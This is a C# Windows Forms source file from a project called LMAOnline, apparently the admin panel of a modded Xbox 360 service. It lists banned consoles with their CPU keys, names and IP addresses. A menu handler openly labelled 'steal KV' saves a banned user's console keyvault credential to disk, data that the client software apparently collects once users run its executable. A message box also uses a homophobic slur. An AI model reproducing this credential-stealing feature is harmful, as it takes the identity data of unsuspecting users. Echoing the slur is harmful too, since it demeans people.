using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.IO;
using System.Threading;
using System.Windows.Forms;
using LMAOnline.Classes;

namespace LMAOnline.Forms
{
    public partial class BannedConsoles : Form
    {
        ConsoleEntry ce = new ConsoleEntry();
        ConsoleManager cm = new ConsoleManager();

        public BannedConsoles()
        {
            InitializeComponent();
        }

        private void GrabClients()
        {
            loadClients();
            //Thread getClients = new Thread(new ThreadStart(loadClients));
            //if(!getClients.IsAlive)
            //    getClients.Start();
        }

        private void loadClients()
        {
            List<ConsoleEntry> consoles = cm.GetBannedConsoles();
            Invoke(new MethodInvoker(delegate
            {
                lv_bannedusers.Items.Clear();
                for (int i = 0; i < consoles.Count; i++)
                {
                    ConsoleEntry entry = consoles[i];
                    ListViewItem item = new ListViewItem(entry.cpukey);
                    item.SubItems.Add(entry.name);
                    item.SubItems.Add(entry.sip);
                    item.SubItems.Add(entry.kvdata != null ? "True" : "False");
                    lv_bannedusers.Items.Add(item);
                }
            }));
        }

        private void lv_bannedusers_MouseDown(object sender, MouseEventArgs e)
        {
            if (e.Button == MouseButtons.Right)
            {
                if (lv_bannedusers.Items.Count > 0) 
                    cms_bannedusers.Show(lv_bannedusers, e.Location); 
                else
                    GrabClients();
            } else if (e.Button == MouseButtons.Left) {
                if (lv_bannedusers.SelectedItems.Count == 1)
                {
                    cm.GetBannedConsole(ref ce, lv_bannedusers.SelectedItems[0].SubItems[0].Text);
                    rtb_banreason.Text = ce.reason;
                    lbl_cpukey.Text = ce.cpukey;
                    lbl_name.Text = ce.name;
                    lbl_ip.Text = ce.sip;
                    lbl_haskv.Text = ce.haskv.ToString();
                    if (lbl_haskv.Text == "True") { lbl_haskv.ForeColor = Color.Green; } else { lbl_haskv.ForeColor = Color.Red; }
                }
                else
                {
                    lbl_cpukey.Text = "*No User Selected*";
                    lbl_name.Text = "*No User Selected*";
                    lbl_ip.Text = "*No User Selected*";
                    lbl_haskv.Text = "*No User Selected*";
                }
            }
        }

        private void BannedConsoles_Load(object sender, EventArgs e)
        {
            //MessageBox.Show("This shit is broken.... No clue why.");
            //this.Close();
            //GrabClients();
        }

        private void cmi_copyIP_Click(object sender, EventArgs e)
        {
            if (lv_bannedusers.SelectedItems.Count > 0)
            {
                Invoke(new MethodInvoker(delegate { Clipboard.SetText(lv_bannedusers.SelectedItems[0].SubItems[0].Text); }));
            }
        }

        private void stealKVToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (lv_bannedusers.SelectedItems.Count > 0)
            {
                cm.GetBannedConsole(ref ce, lv_bannedusers.SelectedItems[0].SubItems[0].Text);
                if (ce.kvdata != null)
                    File.WriteAllBytes(String.Format("KVs\\[Banned] KV - {0}.bin", ce.name), ce.kvdata);
                else
                    MessageBox.Show("No KV Data for this user. Wait for them to boot the xex.", "Gargglin' Sack n' Dak");
            }
        }

        private void refreshUsersToolStripMenuItem_Click(object sender, EventArgs e)
        {
            GrabClients();
        }

        private void removeBannedUserToolStripMenuItem_Click(object sender, EventArgs e)
        {
            cm.GlobalRemoveCPU("banned", lv_bannedusers.SelectedItems[0].SubItems[0].Text);
            Invoke(new MethodInvoker(delegate { MessageBox.Show(String.Format("{0} has been removed from the ban list.", lv_bannedusers.SelectedItems[0].SubItems[1].Text), "Removed Banned Fag"); }));
            GrabClients();
        }
    }
}
